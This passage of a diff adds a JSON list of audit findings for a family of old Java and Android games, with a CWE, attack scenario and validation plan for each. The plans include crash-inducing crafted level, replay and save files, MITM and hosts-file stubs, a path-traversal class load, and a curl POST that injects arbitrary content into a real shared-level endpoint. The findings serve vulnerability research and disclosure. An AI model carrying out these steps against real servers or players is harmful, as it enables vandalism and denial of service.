+    "validation_plan": "On a disposable runnable copy, preserve the original Human.class and create a 268435456-byte player/Human.class, for example with truncate. Launch with a deliberately constrained heap such as -Xmx128m and break at TutorVolleyClassLoader.java:96 or enable JVM allocation/GC recording. Confirm the attempted 268435456-byte array allocation, the ClassNotFoundException path at :75-77, and the absence of a usable player-one AI. Repeating with -Xmx512m should instead show the temporary RSS increase and full read before class-format rejection.",
+    "line": 93,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoClock",
+    "file": "ApoClockHighscoreLocal.java",
+    "category": "unsafe_custom_parser",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-20",
+    "title": "Persisted local highscore/progress string parsed without guards: tampering unlocks all levels or permanently crashes startup",
+    "reachable": true,
+    "attack_scenario": "On a rooted device (or via adb backup/restore on builds that permit it): edit /data/data/net.apogames.apoclock/shared_prefs/ApoClockPref.xml, set solved=28 to unlock every puzzle level, or set highscore to '12;' - the latter bricks the app into a startup crash loop that survives restarts until the app's data is cleared.",
+    "validation_plan": "adb backup the app, unpack with abe, change the 'highscore' string to '12;' and restore; launch and observe immediate force-close with StringIndexOutOfBoundsException at ApoClockHighscoreLocal.java:69 (repeat-crash on relaunch). In a second run set solved=28 and observe all 28 level buttons unlocked/green in the chooser without solving anything.",
+    "line": 69,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "BitsEngineAndroid",
+    "file": "BitsIO.java",
+    "category": "other",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-1333",
+    "title": "Unescaped caller string concatenated into regex in BitsIO.findFile (crash / ReDoS)",
+    "reachable": false,
+    "attack_scenario": "Two modes: (a) crash - a syntactically invalid pattern fragment such as 'a{{' throws PatternSyntaxException on every loop iteration, killing the game thread; (b) hang - a nested-quantifier pattern like '(a+)+$' matched against long filenames causes catastrophic backtracking, freezing the GL/logic thread (soft DoS). Both require no permissions beyond making findFile receive the crafted string.",
+    "validation_plan": "Unit test on desktop JVM (same java.util.regex semantics): create temp dir with files 'aaaa...a' (200 chars x50 entries); call new BitsIO().findFile(dir, \"(a+)+x\", true) after relaxing visibility, measure wall time vs. benign prefix; then call with \"a{{\" and observe PatternSyntaxException stack trace originating at BitsIO.java:148.",
+    "line": 148,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "myTreasureAndroid",
+    "file": "MyTreasureUserLevels.java",
+    "category": "unsafe_custom_parser",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-20",
+    "title": "Deduplication check substrings every server-provided level string; short/empty entries crash the upload thread",
+    "reachable": true,
+    "attack_scenario": "Attacker plants a degenerate record in the shared level DB (anonymous save_level.php POST of an empty/short value, or truncation introduced by an on-path HTTP modifier). Any player who solves their own editor level and taps 'Upload' thereafter crashes: the dedup scan hits the malformed entry before the POST is issued.",
+    "validation_plan": "Proxy get_level.php so one 11-line block contains '' as the level line (index i%11==0). In the app, open Editor, build/solve a level (upload button becomes visible after SOLVE succeeds), press Upload; adb logcat shows FATAL EXCEPTION StringIndexOutOfBoundsException originating at MyTreasureUserLevels.isIn.",
+    "line": 113,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "myTreasureAndroid",
+    "file": "MyTreasureUserlevelsLoad.java",
+    "category": "client_side_trust",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-345",
+    "title": "Anonymous, unauthenticated level-submission protocol (no identity, signature, or rate limiting in client)",
+    "reachable": true,
+    "attack_scenario": "curl -d 'level=<anything>' http://www.apo-games.de/myTreasure/save_level.php inserts arbitrary records that are pushed to every client by get_level.php. This is the amplifier that makes findings 02 and 03 remotely exploitable without any network position: one scripted request poisons the shared catalog for all players. It also permits catalog flooding/griefing. (Honest caveat: the missing auth is ultimately a server property; here we can only prove the client neither sends nor requires credentials.)",
+    "validation_plan": "tcpdump/mitmproxy a legitimate in-game upload to capture the exact request shape; replay it with curl using an arbitrary level string; reopen the user-levels screen in the app and confirm the forged entry is listed and selectable (pair with the '9999' payload from finding 02 to demonstrate end-to-end impact).",
+    "line": 160,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoBot",
+    "file": "ApoBotComponent.java",
+    "category": "unsafe_custom_parser",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-129",
+    "title": "Crafted level start point indexes tile grid out of bounds during render",
+    "reachable": true,
+    "attack_scenario": "Attacker supplies a syntactically valid .bot whose grid is 10x10 but whose start point is (999999, 999999) or negative. Game accepts the level silently, then throws ArrayIndexOutOfBoundsException on first render; in applet mode this kills the applet, on desktop the game window stops functioning. Pure client-side crash, no privilege gain.",
+    "validation_plan": "Generate a minimal valid .bot (one 10x10 level, all GROUND_EMPTY) but overwrite the two start-point ints after the tile data with 0x000186A0 (100000). Load via gameLoad; confirm console ArrayIndexOutOfBoundsException originating at apoBot.ApoBotComponent.renderPlayer.",
+    "line": 546,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoCheating",
+    "file": "ApoCheatingGamePanel.java",
+    "category": "unsafe_custom_parser",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-125",
+    "title": "Unvalidated entity coordinates/tile indices from level file cause out-of-bounds array access and uncaught game crash",
+    "reachable": true,
+    "attack_scenario": "Attacker takes a legitimate .cheat, changes one stored goal coordinate from e.g. 100.0 to 1000000.0 (plain DataOutputStream edit), and shares it. On load, setHands computes x=31250, the guard passes (x-1>=0), and aPlayground[y][x-1] throws ArrayIndexOutOfBoundsException. The exception propagates out of load() on the EDT/startup thread and kills the game. Same result in-game via player start coordinates (movePlayer/isThrowCoin).",
+    "validation_plan": "Write a valid minimal level with ApoCheatingLoadSave.writeLevel(), then rewrite only the first goal x-coordinate as 1000000 (double at its recorded offset). Open it via the Load button. Expected: ArrayIndexOutOfBoundsException at ApoCheatingGamePanel.setHands, game window dead/closed; confirm same with a player x of 1e9 hitting movePlayer after pressing Play.",
+    "line": 315,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoCheating",
+    "file": "ApoCheatingLoadSave.java",
+    "category": "untrusted_deserialization",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-502",
+    "title": "ObjectInputStream wrapped over untrusted level files establishes a latent deserialization sink (no readObject today)",
+    "reachable": false,
+    "attack_scenario": "Theoretical: if a maintainer (or a cloned sibling variant reusing this LoadSave skeleton) later stores richer objects and calls in.readObject() - the natural next step given the stream is already an ObjectInputStream - any class on the game's classpath becomes a gadget candidate for remote code execution via a booby-trapped level file. Today the worst an attacker gets is the crash paths in ApoCheating-01/02.",
+    "validation_plan": "Confirm absence mechanically: rg 'readObject' over the tree returns no hits, while ObjectInputStream appears at lines 15, 350, 368 of ApoCheatingLoadSave.java. To demonstrate the latent hazard, append a call to in.readObject() in a test copy and feed a serialized java.util.HashMap containing a common gadget payload - it would instantiate - then revert; this documents why the wrapper choice matters for clone propagation.",
+    "line": 368,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoDefence",
+    "file": "ApoDefenceHighscore.java",
+    "category": "unsafe_custom_parser",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-20",
+    "title": "Hand-rolled XML highscore parser consumes unauthenticated plain-HTTP response: client DoS and on-screen content spoofing",
+    "reachable": true,
+    "attack_scenario": "Attacker controls daporius.drition.net DNS/host or sits on-path (cleartext HTTP, so any LAN/WiFi/gateway MITM works): (a) serve '<person><nickname>a</nickname><level>zzz</level>' -> Integer.parseInt('zzz') throws NumberFormatException, or '<person>' with no '</person>' -> substring(idx,-1) throws StringIndexOutOfBoundsException; the exception escapes think() (ApoDefenceGame.java:405/431) into ApoDefenceTimer.run(), killing the java.util.Timer thread -> game freezes. (b) serve well-formed rows with nickname 'PWNED' mapped to the victim's current map -> fake leaderboard rows are painted, highlighted red as the player's own placement.",
+    "validation_plan": "Add '127.0.0.1 daporius.drition.net' to /etc/hosts, run python3 -m http.server 80 serving highscore.xml containing '<person><nickname>x</nickname><level>NaN</level></person>'; play Original_First until win/loss screen; observed result: NumberFormatException stack trace and permanently frozen game loop (timer thread dead). Repeat with valid XML using nickname PWNED/map Original_First to confirm spoofed red-highlighted leaderboard row renders.",
+    "line": 87,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoDefence",
+    "file": "ApoDefenceLoadSave.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-400",
+    "title": "Level-file header ints drive unbounded allocations (new int[y][x], BufferedImage(x*32,y*32), count-driven object loops)",
+    "reachable": true,
+    "attack_scenario": "Attacker distributes an attractive 'custom map' .defence whose first 8 bytes are 0x3B9AC9FF twice (or simply 2000000000/-1): victim opens it via Load -> immediate NegativeArraySizeException/OOME crash; a subtler file (e.g. 60000x60000) passes int[] allocation attempts and dies allocating the 1.92M-pixel-x32 BufferedImage, or declares enemyWay size 0x7FFFFFFF so the loop at 177-183 exhausts heap from a ~30-byte file.",
+    "validation_plan": "Write a file: bytes 0-7 big-endian 1000000000,1000000000, append junk, save as evil.defence; launch game, Options->Load, select evil.defence; observed result: NegativeArraySizeException (negative variant) or OutOfMemoryError (large variant) with ApoDefenceLoadSave.readLevel in the trace. Second file with enemyWay-size field 0x7FFFFFFF confirms heap exhaustion from a tiny file.",
+    "line": 159,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoDefence",
+    "file": "ApoDefenceImage.java",
+    "category": "other",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-20",
+    "title": "UTF string from level file used as classpath resource name for underground image - reliable crash, but no filesystem traversal",
+    "reachable": true,
+    "attack_scenario": "Craft a .defence with imageString '/images/nope.png': on load the game throws IllegalArgumentException/NPE during restart() and dies - a second crash vector bundled with the same malicious-level distribution as ApoDefence-03. IMPORTANT negative result: '../../etc/passwd' style values do NOT escape the classpath (getResource never resolves arbitrary filesystem/remote paths here), so this is not a file-disclosure bug; marking that angle explicitly unreachable/theoretical.",
+    "validation_plan": "Take a working Original_First.defence, locate the writeUTF imageString segment ('/images/underground.png' visible as readable string), replace with '/images/zz.png' keeping lengths consistent; open via Load; observed result: IllegalArgumentException ('input == null!') or NPE at ApoDefenceImage.java:108 immediately after selection. Try '../../../etc/passwd' to confirm it also merely crashes (null resource), proving no traversal.",
+    "line": 103,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoIcarus",
+    "file": "ApoJumpLevel.java",
+    "category": "other",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-248",
+    "title": "Uncaught IndexOutOfBounds on death when highscore list has fewer than 2 entries: remote crash of game thread",
+    "reachable": true,
+    "attack_scenario": "Attacker who can answer the client's HTTP request returns e.g. a single entry ('100\\n50\\nAlice'). The victim plays until their inevitable first death; instead of the game-over dialog, an unhandled IndexOutOfBoundsException kills the game loop and the window hangs. Same crash occurs benignly whenever the online highscore cannot be fetched. Attacker gains reliable denial of the running session; no persistence or code execution.",
+    "validation_plan": "Rehost the endpoints (hosts file): stub get_highscore.php to return exactly '100\\n50\\nAlice'. Play until death. Observe stack trace IndexOutOfBoundsException at ApoJumpLevel.isFirstPosition and a frozen, non-responsive game frame. Control: return two entries and death proceeds normally.",
+    "line": 308,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoImp",
+    "file": "ApoImpGame.java",
+    "category": "unsafe_custom_parser",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-129",
+    "title": "Hand-rolled level parser performs unchecked length/geometry arithmetic on server-controlled level strings, crashing the game thread",
+    "reachable": true,
+    "attack_scenario": "1) Attacker MITMs get_level.php (see ApoImp-01) and returns numeric metadata plus a level line of 100 characters. On 'userlevels' play, (100/14+2)*2=18 rows are allocated but the parse loop reads up to index 111 -> StringIndexOutOfBoundsException in loadLevel, uncaught -> ApoSubGame thread dies, window freezes. 2) Alternatively a syntactically fitting level with no '4' goal tile leaves goalX/goalY=-1 and the first think() tick hits level[-1][-1] at line 476 -> ArrayIndexOutOfBoundsException. Impact is reliable client-side denial of service of the game process's logic thread; no code execution.",
+    "validation_plan": "Stub get_level.php with: integer filler lines plus one level line of exactly 100 chars of '1'. Start game, press the userlevels button; console shows StringIndexOutOfBoundsException from apoImp.game.ApoImpGame.loadLevel and the game stops updating (thread death). Repeat with a 196-char grid containing no '4' to trigger the AIOOBE at line 476 on the first tick.",
+    "line": 228,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoImp",
+    "file": "ApoImpUserlevelsLoad.java",
+    "category": "client_side_trust",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-602",
+    "title": "Shared-level upload endpoint trusts the client completely (no auth, no validation, raw content relay)",
+    "reachable": true,
+    "attack_scenario": "A user (or MITM replaying the form-urlencoded POST) floods the shared level database with garbage or oversized strings; other clients auto-download them at startup (ApoImp-01) and parse them (ApoImp-02), so a single poisoned upload griefs every player's level browser and can freeze their game threads. Gained: vandalism/DoS of the community content channel; no per-user accountability.",
+    "validation_plan": "curl -X POST -d 'level=00000000000000...' http://www.apo-games.de/apoElf/save_level.php and then reload the in-game userlevels list (restart client or click upload flow) to confirm the injected entry appears; demonstrates the endpoint accepts unauthenticated arbitrary content. (Live-endpoint test only if the server still exists; otherwise reproduce against a local stub.)",
+    "line": 134,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoImp",
+    "file": "ApoImpUserlevelsLoad.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-770",
+    "title": "Unbounded line-by-line ingestion of server responses into memory lists",
+    "reachable": true,
+    "attack_scenario": "Attacker answering get_level.php streams ~1 GB of '1' lines; the game (which fetches automatically on launch) allocates until heap exhaustion, degrading or killing the client. Gained: reliable client resource exhaustion from a network position.",
+    "validation_plan": "Point www.apo-games.de at a netcat/python stub that emits '1\\n' forever after consuming the POST body; launch the game with -Xmx256m and watch RSS climb until OutOfOfMemoryError appears on the userlevel loader thread.",
+    "line": 184,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoMario",
+    "file": "ApoMarioEditorIO.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-789",
+    "title": "Unvalidated width/height integers from hand-parsed .mar level file drive giant array allocation (OOM crash)",
+    "reachable": true,
+    "attack_scenario": "Attacker shares a '.mar level' whose first 8 bytes encode width=height=0x7FFFFFF0. Victim loads it in the editor; the JVM attempts a ~2^60-element reference array, throws OutOfMemoryError, and the game dies (or hangs thrashing GC with moderately large values like 20000x20000 while allocating per-tile BufferedImages in makeWall/makeGroundWall).",
+    "validation_plan": "Create mar.bin with DataOutputStream.writeInt(Integer.MAX_VALUE-15) twice plus a few trailing ints; rename to evil.mar; Editor > Load level; observe immediate OutOfMemoryError on console / process death. Compare with width=100,height=15 control file which loads normally.",
+    "line": 57,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoMario",
+    "file": "ApoMarioReplay.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-789",
+    "title": "Replay-header width/difficulty reused unvalidated to size level arrays and scale enemy-generation loops",
+    "reachable": true,
+    "attack_scenario": "Attacker posts a 'world record' .rep with width=2000000000. On load, makeLevel attempts a 15x2e9 entity array -> OutOfMemoryError, game crashes; with width=100000 the game instead freezes for minutes building tiles/enemies. Same file also poisons the level-name line consumed by ApoMario-04.",
+    "validation_plan": "Write evil.rep with lines: '2000000000','50','-1', then filler name/author/steps lines; Menu > Load Replay; observe OOM. Second file with '5000','700000','-1',... demonstrates multi-minute hang in level generation (sample with jstack showing ApoMarioRandomLevel.makeRandomLevel frames).",
+    "line": 306,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoNotSoSimple",
+    "file": "ApoNotSoSimpleUserLevels.java",
+    "category": "unsafe_custom_parser",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-20",
+    "title": "Server-controlled highscore lists parsed without cross-validation; misaligned data breaks client state",
+    "reachable": true,
+    "attack_scenario": "MITM returns N level-lines but fewer username-lines: sort() throws IndexOutOfBoundsException at line 102, the catch in load() (lines 60-62) sets this.highscore = null, and the next click on the 'User Levels' menu item (ApoNotSoSimplePanel.setUserGame, line 161 -> getLevel line 112) dereferences the null field, throwing NullPointerException into the AWT event thread; the user-level feature stays broken for the session. Alternatively a truncated level token stream aborts parsing (caught by catch(Throwable) at line 148, returning null) so a hostile server can selectively make user levels unusable. Impact is confined to client-side denial of service / feature breakage - no memory unsafety, and instruction strings are drawn via Graphics.drawString (ApoNotSoSimpleLevel.java:386), not interpreted.",
+    "validation_plan": "Proxy get_highscore.php and reply with 10 groups where the username lines are omitted (only 50 lines total, i%5 mapping skewed). Launch the game, click 'UserLevels': console shows java.lang.IndexOutOfBoundsException from ApoNotSoSimpleUserLevels.sort line 102 followed by NullPointerException from getLevel, and the menu does nothing - confirming the path end-to-end.",
+    "line": 124,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSimple",
+    "file": "ApoSimpleLevelChooser.java",
+    "category": "unsafe_custom_parser",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-129",
+    "title": "Unvalidated level ids from local 'levels' progress file used as ArrayList index (crash / unlock cheat)",
+    "reachable": true,
+    "attack_scenario": "(a) Tamper: edit 'levels' to contain level=1000000000; opening the level chooser throws IndexOutOfBoundsException on the game thread (no catch in ApoSubGame.run), freezing/killing the client. (b) Cheat: conversely, entries with level=1..N and stars=3 unlock every level and maximize star-based coin payouts granted in setLevelSolved/addLevel (ApoSimplePanel.java:716-718, ApoSimpleLevelChooser.java:224-241) without playing.",
+    "validation_plan": "Create 'levels' containing writeInt(1), writeInt(2000000000), writeInt(3) via DataOutputStream; launch and click through to the level chooser: console prints IndexOutOfBoundsException at ApoSimpleLevelChooser.setVisibleButtons and the screen never renders. Replace the id with 90 and stars 3 to confirm full unlock and coin grant on the next win tick.",
+    "line": 139,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSimpleSudoku",
+    "file": "ApoSimpleSudokuLevelChooser.java",
+    "category": "insecure_transport",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-319",
+    "title": "Progress 'achievements' cookie exchanged with apo-games.de cookies.php over plain HTTP",
+    "reachable": true,
+    "attack_scenario": "(1) Player runs the applet build (B_APPLET=true, set in ApoSimpleSudokuApplet.java:26 / ApoScreen.initApplet():162). On the level-chooser screen the client GETs cookies.php and later uploads solved-level IDs. (2) An on-path attacker (open WiFi, malicious ISP) or whoever controls/resolves www.apo-games.de (the domain is long-dead; no TLS, no pinning, so DNS hijack or expired-domain registration works outright) replies with e.g. '0,1,2,...,30,' and forges the player's solved-level record, or logs the upload to profile gameplay progress. Impact is bounded: solvedLevels only paints overlay circles in the chooser (render(), LevelChooser.java:277-283) - every level button is clickable regardless (mouseReleased(), lines 217-228) - so this is record/privacy tampering, not an unlock.",
+    "validation_plan": "Flip the applet path on (launch ApoSimpleSudokuApplet, or set ApoConstants.B_APPLET=true before init), map www.apo-games.de to 127.0.0.1 in /etc/hosts, run `nc -l 80` or a logging Python http.server. Open the level chooser: observe the raw request containing 'GET=&name=apoSudoku_level' in cleartext; answer with '0,1,2,' and observe red overlays on levels 1-3 - proving both the transport exposure and that server bytes become client game state.",
+    "line": 137,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSimpleSudoku",
+    "file": "ApoSimpleSudokuLevel.java",
+    "category": "unsafe_custom_parser",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-20",
+    "title": "Hand-rolled 'connected' chain-string parser has no length/digit/range validation (currently fed only by compile-time literals)",
+    "reachable": false,
+    "attack_scenario": "Theoretical in this build: a player cannot influence these strings - they are baked into the jar. The risk materializes only through reuse: the identical Level-class skeleton in sibling variants is fed from downloaded levels (get_level.php / readLevel), where a hostile server or edited level file supplying '00 1'-style odd-length, non-digit, or out-of-range pairs crashes the game thread (denial of service) at exactly this sink.",
+    "validation_plan": "Edit one literal in ApoSimpleSudokuLevelMake.getFirstLevel() from \"00011021\" to \"0001102\" (odd length), run ApoSimpleSudokuMain and start level 1: observe StringIndexOutOfBoundsException thrown from ApoSimpleSudokuLevel.init line 114 during construction - confirming the parser performs no format validation and fails closed only by accident of its current callers.",
+    "line": 113,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSkunkman",
+    "file": "ApoSkunkmanReplayIO.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-770",
+    "title": "Replay parser trusts attacker-controlled element count: unbounded allocation and NPE on truncated .rep files",
+    "reachable": true,
+    "attack_scenario": "Attacker shares a tournament-looking .rep that is a valid 30-byte header (players=4) followed by size=0x3FFFFFFF and a few MB of filler. Victim loads it: heap fills with boxed Bytes, game freezes/OOMs (concrete crash under default -Xmx). A second file truncated right after the header instead kills the EDT with an NPE. Both are one-click crashes from a file someone asked you to 'watch my replay'.",
+    "validation_plan": "Craft file: DataOutputStream.writeInt(any type)/writeLong/writeBoolean/writeInt(time)/writeInt(players=4)/writeUTF('')/4x writeUTF('') then writeInt(0x7FFFFFFF) + 5MB of 0x00, repeat; run 'java -jar -Xmx64m' and load it -> OutOfMemoryError/hang observable in jconsole. Second file ends after the names arrays -> console shows 'Exception in thread AWT-EventQueue' NullPointerException at ApoSkunkmanReplayIO.readLevel(String) line 40 and the UI dies.",
+    "line": 63,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSkunkman",
+    "file": "ApoSkunkmanEditorIO.java",
+    "category": "unsafe_custom_parser",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-129",
+    "title": "Level/replay editor data places players and goal at unvalidated byte coordinates, causing out-of-bounds array access and crash",
+    "reachable": true,
+    "attack_scenario": "Attacker distributes a 'custom map pack': patching one position byte to 0x7F makes loading the level itself throw ArrayIndexOutOfBoundsException inside makeEditorLevel (instant crash on open). Variant B: coordinate 100 (in-bounds editor array, off-grid playfield) loads fine; once the round starts and that player lays a skunkman, ApoSkunkmanPlayer.thinkAI:498 indexes level[12][100] -> uncaught AIOOBE kills the game thread mid-tournament. Goal-point bytes likewise shift the win tile outside the grid so GoalX rounds can never be won.",
+    "validation_plan": "Hex-edit a valid lastLevel.skunk: byte at offset 5 (player 1 x) -> 0x7F. Launch, menu > Editor > Load: stack trace ArrayIndexOutOfBoundsException at ApoSkunkmanModelEditor.makeEditorLevel(ModelEditor.java:202). Then set it to 100 (0x64, within byte range, outside 15-wide grid), start a match with that player AI-controlled, press the lay key when he is 'standing' off-grid: AIOOBE at ApoSkunkmanPlayer.thinkAI(Player.java:498) and the game window freezes/dies.",
+    "line": 50,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSlitherLink",
+    "file": "ApoSlitherLinkLevelsHelp.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-400",
+    "title": "Hand-parsed local save file 'highscore.apo' triggers uncaught exceptions and unbounded image allocation at startup",
+    "reachable": true,
+    "attack_scenario": "(a) Crash-loop DoS: a file whose solution string declares 99x99 while the level string declares 04x04 causes ArrayIndexOutOfBoundsException during loadLevels() at startup; the game never reaches the menu until the file is deleted. (b) Memory exhaustion: thousands of consistent entries like level='2525'+625 spaces, solution='2525'+625 'a' chars each allocate ~2400x2400 px ARGB images (~23 MB) per entry from a ~2 KB file, exhausting the heap.",
+    "validation_plan": "Craft the file with Java: dos.writeInt(1); dos.writeUTF(\"0404    \"); dos.writeUTF(\"9999\"+...); place next to the jar, launch ApoSlitherLinkMain -> stack trace during init, no window content; remove file -> launches. Repeat with N consistent 25x25 entries to drive heap toward OOM.",
+    "line": 247,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSoccer",
+    "file": "ApoSoccerReplayIO.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-770",
+    "title": "Replay (.rep) parser trusts attacker-chosen record count: readInt-driven allocation loop",
+    "reachable": true,
+    "attack_scenario": "Attacker posts a 'highlight replay' on the community forum sized a few hundred MB with size fields set to 0x7FFFFFFF. Victim opens it via replayLoad; the JVM heap balloons (default heap -> OutOfMemoryError or minutes of GC thrash) and the UI freezes; no persistent damage.",
+    "validation_plan": "Craft rep.rep: two UTF strings, then for the ball section write int 2000000000 followed by a few floats; run game, click replay-load icon, select file; observe heap climb/OOM in jconsole or 'java.lang.OutOfMemoryError: Java heap space' on console while file remains far smaller than allocated list capacity.",
+    "line": 114,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSoccer",
+    "file": "ApoSoccerGame.java",
+    "category": "client_side_trust",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-693",
+    "title": "Full-trust AI plugins can manipulate match outcomes: deliberate forfeit awards exactly 10 goals, and hung think() freezes the game thread",
+    "reachable": true,
+    "attack_scenario": "Two colluding entrants in an ApoSoccer AI league: AI-A contains 'if (enemyName.equals(\"TeamB\")) throw new RuntimeException();'. Every A-vs-B match instantly ends 0:10 for B, handing B maximum points/goal-difference regardless of play quality; results computed by ApoSoccerAnalysis season simulation (analysis loop at ApoSoccerAnalysis.java:97-113) inherit these forged scores. Non-collusive variant: a losing AI freezes the organizer's machine mid-stream by looping forever in think().",
+    "validation_plan": "Modify TestPlayer.think() to 'throw new RuntimeException(\"gg\")' when enemy names contain a sentinel; load it as VisitorAI, start a match; observable: game immediately ends with scoreboard Home 10 : Visitor 0 (debug frame prints the exception message per lines 1728-1730). Freeze variant: replace throw with while(true){}; observe EDT hang and absence of any timeout kill (the >WAIT_TIME_THINK check at ApoTeam.java:566-567 never executes).",
+    "line": 1724,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "TutorVolley",
+    "file": "TutorVolleyClassLoader.java",
+    "category": "path_traversal",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-22",
+    "title": "Class-name to filename mapping does not neutralize '/' or '..' allowing reads of .class files outside the player directory",
+    "reachable": false,
+    "attack_scenario": "Theoretical only: the sole input source is the local user typing into the dialog, who already has full control of the machine, so no privilege boundary is crossed. Its practical significance is forward-looking: if a sibling variant (clone-and-own reuse of this Sun-tutorial-derived loader) ever feeds a network-supplied class name (e.g. from a get_level-style response) into this same loadClass, the missing sanitization turns into remote class-file retrieval from arbitrary local paths.",
+    "validation_plan": "Compile Pwn.class implementing TutorVolleyAI into <run-dir>/../outside/, launch the game, click Load, type '../outside/Pwn'. Observable result: the Pwn constructor executes although the file lies outside player/, demonstrating the traversal. Then confirm no other code path supplies names programmatically (grep shows loadClass called only from TutorVolleyPanelOptions.java:146).",
+    "line": 38,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  }
+]
